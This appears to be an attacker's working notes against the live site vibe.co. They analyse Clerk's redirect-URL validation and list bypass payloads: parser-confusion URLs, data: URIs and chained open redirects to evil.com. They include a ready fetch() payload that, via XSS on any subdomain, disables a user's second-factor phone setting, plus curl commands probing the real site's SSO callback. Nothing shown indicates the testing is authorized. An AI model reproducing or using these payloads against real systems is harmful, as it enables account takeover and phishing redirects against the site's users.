# Open Redirect & XSS Bypass Techniques
## For Next.js + Clerk Applications (vibe.co case study)

## 1. Clerk's Redirect URL Validation - Full Source Analysis

### Validation Flow:
```
sign_in_fallback_redirect_url=URL
  → RedirectUrls.#getRedirectUrl("signIn")
  → #flattenAll() - merges from: searchParams > props > options
  → #filterRedirects() - calls isAllowedRedirect()
  → #toAbsoluteUrls() - converts relative to absolute
```

### `isAllowedRedirect` function (from @clerk/shared):

```javascript
export const isAllowedRedirect =
  (allowedRedirectOrigins, currentOrigin) => (url) => {
    url = relativeToAbsoluteUrl(url, currentOrigin);

    if (!allowedRedirectOrigins) return true; // ALL URLs allowed if not configured!

    const isSameOrigin = currentOrigin === url.origin;
    const isAllowed =
      !isProblematicUrl(url) &&
      (isSameOrigin ||
        allowedRedirectOrigins
          .map(o => globs.toRegexp(trimTrailingSlash(o)))
          .some(o => o.test(trimTrailingSlash(url.origin))));

    return isAllowed;
  };
```

### Banned Checks:
| Check | Pattern | Bypassable? |
|-------|---------|-------------|
| Banned protocols | `['javascript:']` | Only JS banned, `data:` allowed for URIs |
| Null bytes | `/\0/` | No |
| Protocol-relative | `/^\/\//` | Blocks `//evil.com` |
| Control characters | `/[\x00-\x1F]/` | Blocks newlines, tabs in pathname |

### Auto-generated allowed origins (when not configured):
```javascript
origins = [
  window.location.origin,          // https://www.vibe.co
  `https://${eTLD+1}`,             // https://vibe.co
  `https://*.${eTLD+1}`,           // https://*.vibe.co (all subdomains!)
]
```

## 2. Bypass Techniques

### A. Same-origin open redirect chain (MOST PROMISING)
Since Clerk allows ANY `*.vibe.co` URL as redirect target, find a **different** vibe.co endpoint that performs an open redirect with LESS validation:
```
SSO callback → vibe.co/other-redirect-endpoint?url=https://evil.com
```

### B. URL parser inconsistencies (Node.js URL vs Chrome URL)

| URL | Node.js URL().origin | Chrome navigation |
|-----|---------------------|-------------------|
| `https://www.vibe.co\@evil.com` | `https://www.vibe.co` ✅ | `https://www.vibe.co/@evil.com` (normalized) |
| `https://evil.com%2f@www.vibe.co` | `https://www.vibe.co` ✅ | `https://evil.com/@www.vibe.co` (if %2f decoded) |
| `https://www.vibe.co#@evil.com` | `https://www.vibe.co` ✅ | `https://www.vibe.co#@evil.com` (fragment, not navigated) |
| `/@evil.com` | `https://www.vibe.co/@evil.com` ✅ | `https://www.vibe.co/@evil.com` |
| `https:/www.vibe.co@evil.com` | `https://evil.com` ❌ | `https://evil.com` |

### C. Credential confusion (%2f before @)
`https://evil.com%2f@www.vibe.co`
- Node.js new URL(): `evil.com%2f` = username, `www.vibe.co` = host
- `origin = https://www.vibe.co` ✅ PASSES validation
- But browser behavior: URL might be normalized differently
- TEST in browser!

### D. Backslash as path separator
`https://www.vibe.co\@evil.com`
- Chrome/Firefox modern: normalizes `\` to `/`, stays on vibe.co
- Older browsers: might interpret `\` as host separator
- NOT reliable for modern browsers

### E. Fragment-based redirects
`https://www.vibe.co#https://evil.com`
- Validated as: origin=vibe.co, path="/", hash="#https://evil.com"
- If any JS on vibe.co reads `window.location.hash` and redirects there:
  ```javascript
  // Vulnerable code:
  const redirect = window.location.hash.slice(1);
  window.location.href = redirect;
  ```
- Search vibe.co JS for hash-reading redirect code

### F. data: protocol bypass
`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
- hasBannedProtocol() only checks `javascript:`, NOT `data:`
- BUT: `origin = null` on data: URIs, so same-origin check fails
- Only works if allowedRedirectOrigins is undefined/null

### G. window.location chain bypass
```
if (vibe.co has a page that reads a search param and redirects):
  https://www.vibe.co/redirect?target=https://evil.com
  → This would have a DIFFERENT validation (maybe no validation at all!)
```

## 3. XSS to Complete the CSRF Chain

If XSS is found on ANY vibe.co subdomain:
```javascript
// Same-site fetch to clerk.vibe.co (Origin: https://x.vibe.co -> passes same-site)
fetch("https://clerk.vibe.co/v1/me/phone_numbers/IDN?__clerk_api_version=...&_method=PATCH", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "reserved_for_second_factor=false"
})
```

### XSS Entry Points to Check:
1. Profile fields (name, bio) - stored XSS
2. File upload (SVG with JS) - stored XSS
3. OAuth state parameter - reflected
4. Error messages with user input - reflected
5. URL fragment-reading JS - DOM XSS
6. Webhook URLs - server-side XSS
7. Organization name/bio - stored XSS

## 4. Known Clerk CVEs & Bypasses

### CVE-2024-xxx: Redirect URL validation bypass
- Check Clerk's changelog for security fixes
- Look for git commits mentioning "redirect" or "url validation"

### Next.js specific:
- Next.js middleware redirects
- getServerSideProps redirects with user input
- API route redirects with `res.redirect(userInput)`
- next.config.js rewrites/redirects with user input

## 5. Testing Methodology

```bash
# Test open redirect endpoints on vibe.co
curl -v "https://www.vibe.co/TEST_ENDPOINT?url=https://evil.com"
curl -v "https://www.vibe.co/TEST_ENDPOINT?redirect=https://evil.com"
curl -v "https://www.vibe.co/TEST_ENDPOINT?next=https://evil.com"

# Test Clerk redirect with various bypasses
curl -v "https://www.vibe.co/sign-in/sso-callback?sign_in_fallback_redirect_url=https://evil.com"
curl -v "https://www.vibe.co/sign-in/sso-callback?sign_in_fallback_redirect_url=//evil.com"
curl -v "https://www.vibe.co/sign-in/sso-callback?sign_in_fallback_redirect_url=/@evil.com"
```
